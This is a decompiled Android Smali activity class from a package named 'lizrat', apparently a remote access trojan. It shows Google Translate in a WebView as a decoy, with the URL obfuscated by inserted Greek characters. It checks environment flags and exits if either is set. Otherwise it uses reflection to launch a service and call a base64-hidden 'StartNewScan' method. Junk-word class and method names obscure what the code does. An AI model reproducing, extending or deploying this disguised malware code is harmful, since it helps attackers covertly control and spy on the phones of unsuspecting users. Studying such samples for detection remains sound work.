.class public LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;
.super Landroid/app/Activity;
.source "algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23$HelloWebViewClient;
    }
.end annotation


# instance fields
.field wb:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static LOGIT(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8

    const-string v0, "com.appser.aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5"

    const/4 v1, 0x0

    .line 142
    :try_start_0
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-object v0, v1

    .line 150
    :goto_0
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v2
    :try_end_1
    .catch Ljava/lang/IllegalAccessException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/InstantiationException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-object v2, v1

    :goto_1
    const/4 v3, 0x2

    new-array v4, v3, [Ljava/lang/Class;

    .line 158
    const-class v5, Landroid/content/Context;

    const/4 v6, 0x0

    aput-object v5, v4, v6

    .line 159
    const-class v5, Landroid/content/Intent;

    const/4 v7, 0x1

    aput-object v5, v4, v7

    const-string v5, "U3RhcnROZXdTY2Fu"

    .line 160
    invoke-static {v5}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 164
    :try_start_2
    invoke-virtual {v0, v5, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1
    :try_end_2
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :try_start_3
    new-array v0, v3, [Ljava/lang/Object;

    aput-object p0, v0, v6

    aput-object p1, v0, v7

    .line 170
    invoke-virtual {v1, v2, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    .line 60
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 64
    sget-boolean p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->F_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_ORCA:Z

    if-nez p1, :cond_0

    sget-boolean p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->FO_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_RSC:Z

    if-nez p1, :cond_0

    const p1, 0x7f07000a

    .line 66
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->setContentView(I)V

    const p1, 0x7f050045

    .line 67
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/webkit/WebView;

    iput-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    .line 68
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 69
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 70
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const-string v1, "http.agent"

    invoke-static {v1}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    .line 71
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 72
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 73
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    sget-object v2, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {p1, v2}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    .line 75
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    new-instance v2, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23$HelloWebViewClient;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23$HelloWebViewClient;-><init>(LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23$1;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 76
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    new-instance v2, Landroid/webkit/WebChromeClient;

    invoke-direct {v2}, Landroid/webkit/WebChromeClient;-><init>()V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 77
    iget-object p1, p0, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->wb:Landroid/webkit/WebView;

    const-string v2, "ht\u03b8\u03c6tps://tra\u03b8\u03c6nslate.goo\u03b8\u03c6gle.c\u03b8\u03c6om"

    const-string v4, "\u03b8\u03c6"

    invoke-static {v2, v4}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->electricibondsnkenyabentirelyxthoughtsvexplicitdayesdiegowmicexcanadiankreducingqversejteami48(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 79
    invoke-virtual {p0}, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    .line 84
    const-class v2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-static {v2, p1}, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew30;->fitltrialrfairlyglesskkennethqspecificationstenterpriseswcigarettesrmatewtonyldimelinkingz49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 85
    new-instance v2, Landroid/content/Intent;

    const-class v4, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-direct {v2, p1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "com.appser.aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5"

    .line 91
    :try_start_0
    invoke-static {v4}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-object v4, v3

    .line 99
    :goto_0
    :try_start_1
    invoke-virtual {v4}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v5
    :try_end_1
    .catch Ljava/lang/IllegalAccessException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/InstantiationException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-object v5, v3

    :goto_1
    const/4 v6, 0x2

    new-array v7, v6, [Ljava/lang/Class;

    .line 107
    const-class v8, Landroid/content/Context;

    aput-object v8, v7, v1

    .line 108
    const-class v8, Landroid/content/Intent;

    aput-object v8, v7, v0

    const-string v8, "U3RhcnROZXdTY2Fu"

    .line 109
    invoke-static {v8}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 113
    :try_start_2
    invoke-virtual {v4, v8, v7}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3
    :try_end_2
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :try_start_3
    new-array v4, v6, [Ljava/lang/Object;

    aput-object p1, v4, v1

    aput-object v2, v4, v0

    .line 119
    invoke-virtual {v3, v5, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/IllegalAccessException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_2

    .line 130
    :cond_0
    invoke-virtual {p0}, LLiz0rd/lizrat/algeriaatunisiamadventurejspotsssiedisappointednditexpediawmunicipalitygrespondinglheavilyn23;->finish()V

    :catch_3
    :cond_1
    :goto_2
    return-void
.end method

.method protected onDestroy()V
    .locals 0

    .line 51
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method
